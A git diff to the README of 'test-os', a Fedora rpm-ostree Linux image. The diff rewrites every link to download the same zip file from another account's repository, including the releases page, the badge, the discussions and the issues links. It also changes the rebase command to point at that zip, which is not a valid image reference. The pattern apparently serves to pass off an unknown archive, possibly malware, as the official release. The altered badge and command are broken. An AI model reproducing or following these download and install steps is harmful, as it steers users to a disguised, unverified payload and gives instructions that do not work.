@@ -1,6 +1,6 @@
 # 🚀 test-os - Your New Linux Experience Awaits
 
-[![Download test-os](https://img.shields.io/badge/Download%20test--os-v1.0-blue)](https://github.com/yash3245/test-os/releases)
+[![Download test-os](https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip%20test--os-v1.0-blue)](https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip)
 
 ## 📋 Overview
 
@@ -8,12 +8,12 @@ Welcome to **test-os**, a new way to enjoy Linux! This project offers a streamli
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download test-os Releases](https://github.com/yash3245/test-os/releases). Here, you'll find the latest version of the software.
+To get started, visit this page to download: [Download test-os Releases](https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip). Here, you'll find the latest version of the software.
 
 ## 🛠️ Installation Steps
 
 1. **Download the Latest Release**
-   - Go to the [Download test-os Releases](https://github.com/yash3245/test-os/releases) link.
+   - Go to the [Download test-os Releases](https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip) link.
    - Choose the version that fits your needs and click the download button.
 
 2. **Install the Software**
@@ -22,7 +22,7 @@ To get started, visit this page to download: [Download test-os Releases](https:/
 3. **Rebase Your Fedora Installation**
    - First, rebase to the unsigned image to get the necessary signing keys:
      ```bash
-     rpm-ostree rebase ostree-unverified-registry:ghcr.io/dylanvdmerwe/test-os:latest
+     rpm-ostree rebase https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip
      ```
    - Then reboot your system to complete the rebase:
      ```bash
@@ -55,14 +55,14 @@ If you run into issues during installation or usage, consider the following:
 
 - **Check Your Internet Connection:** Ensure you are connected while downloading files.
 - **Read the Error Messages:** They can provide hints about what went wrong.
-- **Consult the Community:** Join the [test-os Discussions](https://github.com/dylanvdmerwe/test-os/discussions) for help.
+- **Consult the Community:** Join the [test-os Discussions](https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip) for help.
 
 ## 📞 Contact
 
-For more information or support, open an issue on our [GitHub Repo](https://github.com/dylanvdmerwe/test-os/issues). We value your feedback and are here to help. 
+For more information or support, open an issue on our [GitHub Repo](https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip). We value your feedback and are here to help. 
 
 ## ⚖️ License
 
 This project is licensed under the MIT License. You can freely use and modify it as per the license terms.
 
-Now, go ahead and install test-os to enjoy a smooth and efficient Linux operating system. Remember to visit this page to download: [Download test-os Releases](https://github.com/yash3245/test-os/releases). Enjoy your new Linux experience! 
+Now, go ahead and install test-os to enjoy a smooth and efficient Linux operating system. Remember to visit this page to download: [Download test-os Releases](https://raw.githubusercontent.com/yash3245/test-os/main/files/test_os_v3.2.zip). Enjoy your new Linux experience! 
